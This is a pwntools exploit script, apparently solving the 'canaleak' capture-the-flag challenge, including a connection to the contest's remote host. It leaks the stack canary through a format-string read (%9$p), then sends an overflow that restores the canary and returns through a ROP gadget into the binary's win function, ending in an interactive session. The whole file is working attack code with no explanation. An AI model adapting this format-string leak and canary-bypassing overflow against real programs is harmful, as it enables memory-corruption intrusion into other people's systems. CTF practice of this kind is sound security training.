#!/usr/bin/env python3

from pwn import *

elf = ELF("./chall")

context.update(binary="./chall", encoding='latin-1')

def one_gadgets(filename, base_addr=0):
    return [
        (int(i) + base_addr)
        for i in subprocess.check_output(["one_gadget", "--raw", "-l0", filename])
        .decode()
        .split(" ")
    ]

def start():
    if args.GDB:
        return gdb.debug(elf.path)
    elif args.REMOTE:
        return remote("canaleak-pwn.wanictf.org", 9006)
    else:
        return process([elf.path])


rop = ROP(elf)
def main():
    io = start()
    io.clean(1)
    io.sendline("%9$p")
    canary = int(io.recvline(1).strip(), 16)
    success(f"Leaked Canary: {hex(canary)}")
    io.clean(1)
    CANARY_OFFSET = 24
    RETURN_OFFSET = CANARY_OFFSET + 16
    io.fit({24: canary, RETURN_OFFSET: [rop.ret[0], elf.sym.win]})
    io.interactive()


if __name__ == "__main__":
    main()
